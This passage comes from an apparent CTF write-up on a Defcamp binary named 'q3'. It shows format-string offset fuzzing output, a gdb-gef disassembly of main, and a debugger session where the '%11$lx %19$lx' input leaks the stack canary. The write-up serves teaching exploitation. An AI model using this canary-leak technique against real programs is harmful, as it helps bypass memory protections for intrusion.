</span></span><span class="line"><span class="cl"><span class="err">11</span> <span class="nf">AAAA</span> <span class="no">a17e6a7c1c53c000</span>                                       <span class="err">&lt;</span><span class="p">---</span> <span class="no">This</span> <span class="no">is</span> <span class="no">of</span> <span class="no">interest</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8341</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8343</span>
</span></span><span class="line"><span class="cl"><span class="err">12</span> <span class="nf">AAAA</span> <span class="mi">555555554830</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8343</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8345</span>
</span></span><span class="line"><span class="cl"><span class="err">13</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">ffff7a05b97</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8345</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8347</span>
</span></span><span class="line"><span class="cl"><span class="err">14</span> <span class="nf">AAAA</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8347</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8349</span>
</span></span><span class="line"><span class="cl"><span class="err">15</span> <span class="nf">AAAA</span> <span class="mi">7</span><span class="no">fffffffde88</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8349</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8351</span>
</span></span><span class="line"><span class="cl"><span class="err">16</span> <span class="nf">AAAA</span> <span class="mi">100008000</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8351</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8353</span>
</span></span><span class="line"><span class="cl"><span class="err">17</span> <span class="nf">AAAA</span> <span class="mi">55555555477</span><span class="no">a</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8353</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8355</span>
</span></span><span class="line"><span class="cl"><span class="err">18</span> <span class="nf">AAAA</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8355</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">[+]</span> <span class="nf">Starting</span> <span class="no">local</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span><span class="p">:</span> <span class="no">pid</span> <span class="mi">8357</span>
</span></span><span class="line"><span class="cl"><span class="err">19</span> <span class="nf">AAAA</span> <span class="mi">8</span><span class="no">f241916698aca1f</span>                                     <span class="err">&lt;</span><span class="p">---</span> <span class="no">This</span> <span class="no">is</span> <span class="no">of</span> <span class="no">interest</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="err">[*]</span> <span class="nf">Stopped</span> <span class="no">process</span> <span class="err">&#39;</span><span class="p">.</span><span class="err">/</span><span class="no">q3</span><span class="err">&#39;</span> <span class="p">(</span><span class="no">pid</span> <span class="mi">8357</span><span class="p">)</span>
</span></span></code></pre></div><p>So, the addresses starting from <code>0x7f</code> are libc addresses and we have offset for our input at 8 but what are those at offset 11 and 19? Whatever it is, this is something we might need. Upon discussing this from a guy(super helpful) named Faith, he told me that it <strong>could be</strong> stack canary address. Now, if we didn&rsquo;t had a format string vulnerability then we had to bruteforce the value,luckily enough we have that vulnerability here.</p>
<p>To be more broad:-
I&rsquo;ll be using gdb-gef as we have to inspect some of the registers, et&rsquo;s break the <code>__main__</code> function:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">disas</span> <span class="no">main</span>
</span></span><span class="line"><span class="cl"><span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">main</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000077a</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">push</span>   <span class="no">rbp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000077b</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000077e</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x30</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000782</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000078b</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000078f</span> <span class="err">&lt;+</span><span class="mi">21</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000791</span> <span class="err">&lt;+</span><span class="mi">23</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x20</span><span class="p">],</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000799</span> <span class="err">&lt;+</span><span class="mi">31</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x18</span><span class="p">],</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007a1</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x200868</span><span class="p">]</span>        <span class="c1"># 0x201010 &lt;stdin@@GLIBC_2.2.5&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000007a8</span> <span class="err">&lt;+</span><span class="mi">46</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x28</span><span class="p">],</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007ac</span> <span class="err">&lt;+</span><span class="mi">50</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x101</span><span class="p">]</span>        <span class="c1"># 0x8b4
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000007b3</span> <span class="err">&lt;+</span><span class="mi">57</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007b8</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x640</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007bd</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x28</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007c1</span> <span class="err">&lt;+</span><span class="mi">71</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007c5</span> <span class="err">&lt;+</span><span class="mi">75</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x10</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007ca</span> <span class="err">&lt;+</span><span class="mi">80</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007cd</span> <span class="err">&lt;+</span><span class="mi">83</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x650</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007d2</span> <span class="err">&lt;+</span><span class="mi">88</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xe9</span><span class="p">]</span>        <span class="c1"># 0x8c2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000007d9</span> <span class="err">&lt;+</span><span class="mi">95</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x620</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007de</span> <span class="err">&lt;+</span><span class="mi">100</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007e2</span> <span class="err">&lt;+</span><span class="mi">104</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007e5</span> <span class="err">&lt;+</span><span class="mi">107</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007ea</span> <span class="err">&lt;+</span><span class="mi">112</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x640</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007ef</span> <span class="err">&lt;+</span><span class="mi">117</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rdi</span><span class="p">,[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0xd2</span><span class="p">]</span>        <span class="c1"># 0x8c8
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>   <span class="err">0</span><span class="nf">x00000000000007f6</span> <span class="err">&lt;+</span><span class="mi">124</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x00000000000007fb</span> <span class="err">&lt;+</span><span class="mi">129</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x640</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000800</span> <span class="err">&lt;+</span><span class="mi">134</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x28</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000804</span> <span class="err">&lt;+</span><span class="mi">138</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000808</span> <span class="err">&lt;+</span><span class="mi">142</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x100</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000080d</span> <span class="err">&lt;+</span><span class="mi">147</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000810</span> <span class="err">&lt;+</span><span class="mi">150</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x650</span> <span class="p">&lt;</span><span class="no">fgets@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000815</span> <span class="err">&lt;+</span><span class="mi">155</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000081a</span> <span class="err">&lt;+</span><span class="mi">160</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">mov</span>    <span class="no">rcx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rbp-0x8</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000081e</span> <span class="err">&lt;+</span><span class="mi">164</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">xor</span>    <span class="no">rcx</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>   <span class="err">&lt;</span><span class="p">-</span> <span class="no">This</span> <span class="no">line</span> <span class="no">checks</span> <span class="no">whether</span> <span class="no">the</span> <span class="no">provided</span> <span class="no">canary</span> <span class="no">is</span> <span class="no">equal</span> <span class="no">to</span> <span class="no">the</span> <span class="no">one</span> <span class="no">calculated</span> <span class="no">before</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000827</span> <span class="err">&lt;+</span><span class="mi">173</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">je</span>     <span class="mh">0x82e</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">180</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x0000000000000829</span> <span class="err">&lt;+</span><span class="mi">175</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">call</span>   <span class="mh">0x630</span> <span class="p">&lt;</span><span class="no">__stack_chk_fail@plt</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">   <span class="err">0</span><span class="nf">x000000000000082e</span> <span class="err">&lt;+</span><span class="mi">180</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">leave</span>  
</span></span><span class="line"><span class="cl">   <span class="mi">0x000000000000082f</span> <span class="err">&lt;+</span><span class="mi">181</span><span class="err">&gt;</span><span class="p">:</span>	<span class="no">ret</span>    
</span></span><span class="line"><span class="cl"><span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
</span></span></code></pre></div><p>Let&rsquo;s try to check those two offsets 11 and 19 to see if it&rsquo;s the stack canary or not:-</p>
<p>At first, we need to setup a breakpoint at the instruction where the comaprison happens i.e. <code>main+164</code> and we will just give random input at second and analyse the registers.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">b</span> <span class="p">*</span><span class="no">main</span><span class="err">+</span><span class="mi">164</span>
</span></span><span class="line"><span class="cl"><span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="no">at</span> <span class="mi">0x81e</span>
</span></span><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>
</span></span><span class="line"><span class="cl"><span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">home</span><span class="err">/</span><span class="no">robin</span><span class="err">/</span><span class="no">CTFs</span><span class="err">/</span><span class="no">Defcamp</span><span class="err">/</span><span class="no">q3</span> 
</span></span><span class="line"><span class="cl"><span class="no">Enter</span> <span class="no">name</span> <span class="p">:</span> <span class="err">%</span><span class="mi">11</span><span class="no">$lx</span> <span class="err">%</span><span class="mi">19</span><span class="no">$lx</span> 
</span></span><span class="line"><span class="cl"><span class="no">Hello</span>
</span></span><span class="line"><span class="cl"><span class="err">50</span><span class="nf">a01b0663fa1e00</span> <span class="no">ebd42dea12670b41</span>
</span></span><span class="line"><span class="cl"><span class="nf">Enter</span> <span class="no">sentence</span> <span class="p">:</span> <span class="no">AAAA</span>
</span></span><span class="line"><span class="cl"><span class="err">[</span> <span class="nl">Legend:</span> <span class="nf">Modified</span> <span class="no">register</span> <span class="err">|</span> <span class="no">Code</span> <span class="err">|</span> <span class="no">Heap</span> <span class="err">|</span> <span class="no">Stack</span> <span class="err">|</span> <span class="no">String</span> <span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="nf">registers</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rax</span>   <span class="p">:</span> <span class="mi">0x0</span>               
</span></span><span class="line"><span class="cl"><span class="no">$rbx</span>   <span class="p">:</span> <span class="mi">0x0</span>               
</span></span><span class="line"><span class="cl"><span class="no">$rcx</span>   <span class="p">:</span> <span class="mi">0x50a01b0663fa1e00</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rdx</span>   <span class="p">:</span> <span class="mi">0x00007ffff7dd18d0</span>  <span class="err">→</span>  <span class="mi">0x0000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rsp</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd10</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7de59a0</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_dl_fini</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">rbp</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rbp</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd40</span>  <span class="err">→</span>  <span class="mi">0x0000555555554830</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">r15</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rsi</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd20</span>  <span class="err">→</span>  <span class="mi">0x2520000a41414141</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">AAAA</span><span class="err">&#34;?</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rdi</span>   <span class="p">:</span> <span class="mi">0x00007fffffffdd21</span>  <span class="err">→</span>  <span class="mi">0x312520000a414141</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">AAA</span><span class="err">&#34;?</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$rip</span>   <span class="p">:</span> <span class="mi">0x000055555555481e</span>  <span class="err">→</span>  <span class="mi">0x000028250c334864</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">dH3</span>
</span></span><span class="line"><span class="cl">                                                        <span class="err">%(&#34;?)</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r8</span>    <span class="p">:</span> <span class="mi">0x0000555555756675</span>  <span class="err">→</span>  <span class="err">&#34;</span><span class="no">x</span> <span class="err">%</span><span class="mi">19</span><span class="no">$lx</span><span class="err">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r9</span>    <span class="p">:</span> <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="p">[</span><span class="no">loop</span> <span class="no">detected</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r10</span>   <span class="p">:</span> <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="mi">0x00007ffff7fd24c0</span>  <span class="err">→</span>  <span class="p">[</span><span class="no">loop</span> <span class="no">detected</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r11</span>   <span class="p">:</span> <span class="mi">0x246</span>             
</span></span><span class="line"><span class="cl"><span class="no">$r12</span>   <span class="p">:</span> <span class="mi">0x0000555555554670</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_start</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">xor</span> <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r13</span>   <span class="p">:</span> <span class="mi">0x00007fffffffde20</span>  <span class="err">→</span>  <span class="mi">0x0000000000000001</span>
</span></span><span class="line"><span class="cl"><span class="nf">$r14</span>   <span class="p">:</span> <span class="mi">0x0</span>               
</span></span><span class="line"><span class="cl"><span class="no">$r15</span>   <span class="p">:</span> <span class="mi">0x0</span>               
</span></span><span class="line"><span class="cl"><span class="no">$eflags</span><span class="p">:</span> <span class="p">[</span><span class="no">ZERO</span> <span class="no">carry</span> <span class="no">PARITY</span> <span class="no">adjust</span> <span class="no">sign</span> <span class="no">trap</span> <span class="no">INTERRUPT</span> <span class="no">direction</span> <span class="no">overflow</span> <span class="no">resume</span> <span class="no">virtualx86</span> <span class="no">identification</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nl">$cs:</span> <span class="err">0</span><span class="nf">x0033</span> <span class="no">$ss</span><span class="p">:</span> <span class="mi">0x002b</span> <span class="no">$ds</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$es</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$fs</span><span class="p">:</span> <span class="mi">0x0000</span> <span class="no">$gs</span><span class="p">:</span> <span class="mi">0x0000</span> 
</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="no">stack</span> <span class="err">────</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd10</span><span class="err">│+</span><span class="mi">0x0000</span><span class="p">:</span> <span class="mi">0x00007ffff7de59a0</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">_dl_fini</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">rbp</span>	 <span class="err">←</span> <span class="no">$rsp</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd18</span><span class="err">│+</span><span class="mi">0x0008</span><span class="p">:</span> <span class="mi">0x00007ffff7dcfa00</span>  <span class="err">→</span>  <span class="mi">0x00000000fbad2288</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd20</span><span class="err">│+</span><span class="mi">0x0010</span><span class="p">:</span> <span class="mi">0x2520000a41414141</span> <span class="p">(</span><span class="err">&#34;</span><span class="no">AAAA</span><span class="err">&#34;?</span><span class="p">)</span>	 <span class="err">←</span> <span class="no">$rsi</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd28</span><span class="err">│+</span><span class="mi">0x0018</span><span class="p">:</span> <span class="mi">0x00000a786c243931</span> <span class="p">(</span><span class="err">&#34;</span><span class="mi">19</span><span class="no">$lx</span><span class="err">&#34;?</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd30</span><span class="err">│+</span><span class="mi">0x0020</span><span class="p">:</span> <span class="mi">0x00007fffffffde20</span>  <span class="err">→</span>  <span class="mi">0x0000000000000001</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd38</span><span class="err">│+</span><span class="mi">0x0028</span><span class="p">:</span> <span class="mi">0x50a01b0663fa1e00</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nf">x00007fffffffdd40</span><span class="err">│+</span><span class="mi">0x0030</span><span class="p">:</span> <span class="mi">0x0000555555554830</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">__libc_csu_init</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">push</span> <span class="no">r15</span>	 <span class="err">←</span> <span class="no">$rbp</span>
